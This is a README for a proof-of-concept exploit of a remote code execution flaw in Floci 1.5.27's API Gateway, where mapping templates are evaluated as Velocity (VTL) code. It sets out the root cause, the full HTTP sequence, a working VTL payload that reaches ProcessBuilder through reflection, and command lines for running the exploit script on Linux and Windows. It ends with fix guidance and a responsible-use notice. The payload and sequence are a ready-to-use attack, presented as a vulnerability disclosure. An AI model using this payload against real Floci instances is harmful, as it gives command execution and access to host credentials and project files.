# Floci 1.5.27 API Gateway VTL RCE PoC

This directory documents and validates an API Gateway Velocity Template Language RCE in Floci `1.5.27`.

Floci evaluates user-controlled API Gateway mapping templates with Apache Velocity. The exposed template objects allow reflection from `$util` into `java.lang.ProcessBuilder`. An attacker who can create or update an API Gateway integration response can store a malicious response template, invoke the API, and execute an operating-system command in the Floci JVM process.

Research status: verified locally end to end through Floci's HTTP API and a standalone PoC.

## Affected Target

- Product: Floci
- Version analyzed: `1.5.27`
- Commit analyzed: `238294e779d0cd24835ba04d7bb16b1e1fd15f76`
- Service surface: API Gateway REST API integration response templates
- Impact: command execution in the Floci server process
- Default exposure note: IAM policy enforcement is disabled by default

## Impact

When a Floci instance exposes its AWS-compatible API endpoint to an attacker, the attacker can create a REST API, configure a `MOCK` integration, place a malicious VTL response template in the integration response, deploy a stage, and invoke the route. The response template executes server-side during request processing and can start arbitrary local processes.

In the validated local run, the payload executed `cmd.exe /c echo FLOCI_STANDALONE_POC>...` and created a marker file from the Floci process. On Linux targets the same primitive can run `sh -c '<command>'`.

Severity is critical for exposed Floci deployments where untrusted users can reach the API Gateway control plane. It is high to critical for shared developer or CI environments because the command runs with the Floci process privileges and can access local credentials, mounted project files, Docker credentials, service data, and adjacent emulator state available to that process.

## Preconditions

- The attacker can reach Floci's HTTP endpoint.
- API Gateway service support is enabled.
- The attacker can call API Gateway REST control-plane endpoints such as `/restapis`.
- IAM enforcement is disabled or does not block the attacker's API Gateway control-plane calls.
- The target host has an executable command path matching the supplied `--argv`.

Floci's default application config enables API Gateway and disables IAM policy enforcement:

```yaml
services:
  apigateway:
    enabled: true
  apigatewayv2:
    enabled: true
  iam:
    enabled: true
    enforcement-enabled: false
```

## Root Cause

The API Gateway integration response API stores attacker-controlled `responseTemplates` without sandboxing them as untrusted code:

```text
ApiGatewayService.putIntegrationResponse(...)
  request["responseTemplates"] -> IntegrationResponse.responseTemplates
```

When a `MOCK` integration is invoked, Floci selects the configured response template and evaluates it through `VtlTemplateEngine`:

```text
ApiGatewayExecuteController.invokeMock(...)
  template = ir.responseTemplates()["application/json"]
  result = vtlEngine.evaluate(template, vtlCtx)
```

`VtlTemplateEngine` constructs a default `VelocityEngine`, exposes Java helper objects such as `$util`, and evaluates the template:

```text
new VelocityEngine()
vc.put("util", new UtilVariable(objectMapper))
engine.evaluate(vc, writer, "apigw-template", template)
```

The resulting Velocity environment allows a template to call Java reflection methods:

```vtl
$util.getClass().forName('java.lang.ProcessBuilder')
```

From there, the template can construct a `ProcessBuilder`, start a process, and wait for completion.

## Exploit Flow

The PoC performs the following HTTP sequence:

1. `POST /restapis`
2. `GET /restapis/{apiId}/resources`
3. `POST /restapis/{apiId}/resources/{rootId}`
4. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET`
5. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/responses/200`
6. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/integration`
7. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/integration/responses/200`
8. `POST /restapis/{apiId}/deployments`
9. `POST /restapis/{apiId}/stages`
10. `GET /execute-api/{apiId}/prod/rce`

The malicious response template is stored at step 7 and executed at step 10.

## Payload

The PoC uses a `ProcessBuilder(List<String>)` path so command arguments are preserved:

```vtl
#set($pbClass=$util.getClass().forName('java.lang.ProcessBuilder'))
#set($listClass=$util.getClass().forName('java.util.List'))
#set($ctor=$pbClass.getConstructor($listClass))
#set($cmd=$util.parseJson('["sh","-c","id > /tmp/floci_vtl_rce"]'))
#set($pb=$ctor.newInstance($cmd))
#set($p=$pb.start())
#set($exit=$p.waitFor())
{"ok":true,"exit":"$exit"}
```

## Files

- `poc.py` - stdlib-only Python exploit driver with target host and port supplied by CLI.
- `evidence/2026-06-23-local-verification.txt` - local verification transcript.

## Usage

Linux target marker:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --argv sh -c 'id > /tmp/floci_vtl_rce'
cat /tmp/floci_vtl_rce
```

Windows target marker:

```powershell
python poc.py --host 127.0.0.1 --port 4566 --argv cmd.exe /c "whoami > C:/Temp/floci_vtl_rce.txt"
Get-Content C:\Temp\floci_vtl_rce.txt
```

Leave the created REST API in place for inspection:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --argv sh -c 'id > /tmp/floci_vtl_rce' --no-cleanup
```

Expected success output shape:

```text
[+] REST API id: d1e873f2f8
[+] Resource id: cfd975b9
[+] Trigger response: {"ok":true,"exit":"0"}
[+] Cleanup delete REST API: HTTP 202
```

## Local Verification

The finding was verified in two ways.

First, a Quarkus/JUnit end-to-end test drove Floci's HTTP API in-process and asserted marker creation:

```powershell
.\mvnw.cmd '-Denforcer.skip=true' '-Dmaven.compiler.release=21' '-Dmaven.compiler.enablePreview=true' '-DargLine=--enable-preview' '-Dtest=ApiGatewayVtlRceExploitTest' test
```

Result:

```text
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
target\apigw-vtl-rce-marker.txt => FLOCI_APIGW_VTL_RCE
```

Second, a live local Floci dev server was started on `127.0.0.1:4566` and this standalone PoC was run against it:

```powershell
python poc.py --host 127.0.0.1 --port 4566 --argv cmd.exe /c "echo FLOCI_STANDALONE_POC>C:/Temp/floci_standalone_poc.txt"
```

Result:

```text
[+] Trigger response: {"ok":true,"exit":"0"}
C:\Temp\floci_standalone_poc.txt => FLOCI_STANDALONE_POC
```

## Fix Direction

Do not evaluate API Gateway mapping templates with unrestricted Java reflection. A defensive patch should:

- configure Velocity with a secure uberspector and deny reflection/classloader/process access;
- expose only API Gateway-compatible helper methods, not arbitrary Java object graphs;
- add regression tests that prove `$util.getClass()`, `Class.forName`, `ProcessBuilder`, `Runtime`, and classloader access are unavailable from templates;
- treat API Gateway templates as untrusted data-plane code and isolate evaluation from the Floci JVM where practical;
- require authorization for API Gateway control-plane mutation endpoints when Floci is bound beyond localhost.

## Responsible Use

Run this PoC only against local research targets, owned systems, or explicitly authorized lab instances.
